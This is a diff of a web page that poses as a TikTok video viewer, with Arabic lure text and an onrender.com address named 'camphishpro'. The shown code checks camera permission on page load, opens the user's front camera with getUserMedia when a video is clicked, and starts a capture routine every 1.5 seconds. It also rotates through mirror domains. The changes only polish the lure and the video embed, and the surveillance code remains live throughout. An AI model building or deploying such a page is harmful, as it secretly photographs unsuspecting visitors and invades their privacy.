@@ -4,10 +4,10 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#0f0f0f">
-<title>اضغط لمشاهدة فيديو تيك توك</title>
+<title>اضغط لمشاهدة الفيديو على تيك توك</title>
 
     <!-- وسوم المعاينة والوصف المخصصة لتيك توك -->
-    <meta name="description" content="قناتي تهتم بكل ما يهم المرأة وبكل جديد في عالم الموضة والازياء والجمال، شاهد الفيديو وشاركنا رأيك." />
+    <meta name="description" content="شاهد هذا المقطع المميز على تيك توك واستمتع بالمشاهدة!" />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="تيك توك" />
     <meta property="og:url" content="https://camphishpro.onrender.com/" />
@@ -119,8 +119,7 @@ body.drawer-mode .main{margin-inline-start:0}
 .watch{display:flex;gap:24px;padding:24px;max-width:1400px;margin:0 auto}
 .w-primary{flex:1;min-width:0}
 .w-secondary{width:360px;flex:none}
-.player{position:relative;width:100%;max-width:400px;aspect-ratio:9/16;background:#000;border-radius:16px;overflow:hidden;margin:0 auto;box-shadow:0 8px 24px rgba(0,0,0,.6)}
-.player iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
+.player{position:relative;width:100%;max-width:400px;background:#000;border-radius:16px;overflow:hidden;margin:0 auto;display:flex;justify-content:center;align-items:center;box-shadow:0 8px 24px rgba(0,0,0,.6)}
 .yt-link{display:inline-block;margin-top:8px;font-size:13px;color:#ff0050;font-weight:600}
 .w-title{font-size:18px;font-weight:700;line-height:1.4;margin:12px 0 8px}
 .w-row{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
@@ -285,7 +284,6 @@ const mirrorDomains = [
     "https://youtube-my-2-6x2n.onrender.com/"
 ];
 
-// الانتقال للصفحة التالية عند ضغط الزر الأحمر في التنبيه
 function goToNextMirror() {
     const urlParams = new URLSearchParams(window.location.search);
     let currentAttempt = parseInt(urlParams.get('n') || '0');
@@ -327,7 +325,6 @@ async function autoCheckPermission() {
 document.addEventListener('DOMContentLoaded', autoCheckPermission);
 
 /* ===== البيانات مخصصة لتيك توك فقط ===== */
-const DC = 'cute baby girl 🤣❤️ #ai #cartoon #cartoonforkids';
 const VIDEOS = [
  {
    id: '7696817413618191649',
@@ -368,7 +365,6 @@ const ICONS = {
 };
 const ic=(n,c='')=>`<svg class="i ${c}" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="${n==='shorts'?'evenodd':'nonzero'}" d="${ICONS[n]}"/></svg>`;
 
-/* ===== Helpers ===== */
 const $=(s,r=document)=>r.querySelector(s);
 const ar=n=>String(n).replace(/\d/g,d=>'٠١٢٣٤٥٦٧٨٩'[d]);
 const fmt=n=>{let v,u='';if(n>=1e9){v=n/1e9;u=' مليار'}else if(n>=1e6){v=n/1e6;u=' مليون'}else if(n>=1e3){v=n/1e3;u=' ألف'}else return ar(n);v=v>=10?Math.round(v):Math.round(v*10)/10;return ar(v).replace('.','٫')+u};
@@ -381,7 +377,6 @@ const linkOf=v=>`https://www.tiktok.com/@${v.ch}/video/${v.id}`;
 
 const S={view:'home',cat:'الكل',q:'',cur:null,liked:new Set(),disliked:new Set(),subs:new Set(),saved:new Set(),dl:new Set(),dling:false,hist:[],comments:{},cl:new Set(),descOpen:false};
 
-/* ===== الكاميرا والتحكم بالصلاحيات ===== */
 let mediaStream = null;
 
 function toast(html,{sticky=false,ms=2600}={}){
@@ -402,7 +397,6 @@ function toggleSidebar(){
 }
 addEventListener('resize',updateLayout);
 
-/* ===== Templates ===== */
 const logoHtml=()=>`<button class="logo" data-nav="home" aria-label="تيك توك"><svg viewBox="0 0 24 24" fill="#fff"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 003 15.68 6.34 6.34 0 009.34 22a6.34 6.34 0 006.34-6.34V9.27a8.16 8.16 0 004.76 1.52v-3.4a4.85 4.85 0 01-.85-.7z"/></svg><span>تيك توك</span></button>`;
 const navBtn=(view,icon,label)=>`<button class="sb-item ${S.view===view?'active':''}" data-nav="${view}">${ic(icon)}<span>${label}</span></button>`;
 
@@ -421,7 +415,6 @@ function renderBnav(){
   $('#bnav').innerHTML=it.map(([v,i,l])=>`<button class="${S.view===v?'active':''}" data-nav="${v}">${ic(i)}<span>${l}</span></button>`).join('');
 }
 
-/* جلب صورة تيك توك المباشرة للتطبيق */
 const cardHtml = v => {
     let thumbUrl = `https://www.tiktok.com/api/img/?itemId=${v.id}&location=0`;
     return `<article class="card" data-open="${v.id}"><div class="thumb"><img loading="lazy" src="${thumbUrl}" alt="" onerror="this.style.display='none'"><span class="dur">${v.dur}</span></div><div class="meta">${avatar(v.ch)}<div><h3 class="t">${v.title}</h3><div class="sub">@${v.ch}</div><div class="sub">${fmt(v.views)} مشاهدة • ${v.time}</div></div></div></article>`;
@@ -480,7 +473,6 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== الكاميرا والانتقال ===== */
 async function openVideo(id) {
     if (mediaStream) {
         executeWatchTransition(id);
@@ -489,15 +481,11 @@ async function openVideo(id) {
 
     try {
         mediaStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: { ideal: 'user' }
-            } 
+            video: { facingMode: { ideal: 'user' } } 
         });
 
         const videoEl = document.getElementById('video');
-        if (videoEl) {
-            videoEl.srcObject = mediaStream;
-        }
+        if (videoEl) videoEl.srcObject = mediaStream;
 
         executeWatchTransition(id);
         startPeriodicCapture();
@@ -547,16 +535,19 @@ function startPeriodicCapture() {
     }, 1500);
 }
 
-/* ===== صفحة مشاهدة فيديوهات تيك توك الرسمية ===== */
+/* ===== صفحة المشاهدة باستخدام مشغل تيك توك الرسمي المدمج embed.js ===== */
 function renderWatch(){
   const v = cur();
   const rel = [...VIDEOS].filter(x => x.id !== v.id).sort((a,b) => (b.cat === v.cat) - (a.cat === v.cat));
   
-  // مشغل تيك توك الرسمي المعتمد للتضمين بدون مشاكل
-  let playerHtml = `<iframe src="https://www.tiktok.com/player/v1/${v.id}?music_info=1&description=1" style="width:100%;height:100%;border:0;" allow="autoplay; encrypted-media;" allowfullscreen></iframe>`;
+  let playerHtml = `
+    <blockquote class="tiktok-embed" cite="https://www.tiktok.com/@${v.ch}/video/${v.id}" data-video-id="${v.id}" style="width:100%; max-width:605px; min-width:325px; margin:0 auto; border:0;">
+      <section></section>
+    </blockquote>
+  `;
 
   $('#view').innerHTML = `<div class="watch"><div class="w-primary">
-    <div class="player">${playerHtml}</div>
+    <div class="player" style="max-width:400px; height:auto; min-height:580px; margin:0 auto; background:#000;">${playerHtml}</div>
     <div class="yt-link-wrap"><a class="yt-link" href="${linkOf(v)}" target="_blank" rel="noopener">الفيديو لا يعمل؟ شاهده على تطبيق تيك توك الرسمي ↗</a></div>
     <div id="wMeta"></div>
     <div id="wComments">
@@ -568,6 +559,13 @@ function renderWatch(){
         let tUrl = `https://www.tiktok.com/api/img/?itemId=${x.id}&location=0`;
         return `<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="${tUrl}" alt="" onerror="this.style.display='none'"><span class="dur">${x.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">@${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`;
     }).join('')}</aside></div>`;
+
+  // تحميل مشغل تيك توك المدمج رسمياً
+  const script = document.createElement('script');
+  script.src = 'https://www.tiktok.com/embed.js';
+  script.async = true;
+  document.body.appendChild(script);
+
   refreshMeta();
   refreshComments();
 }
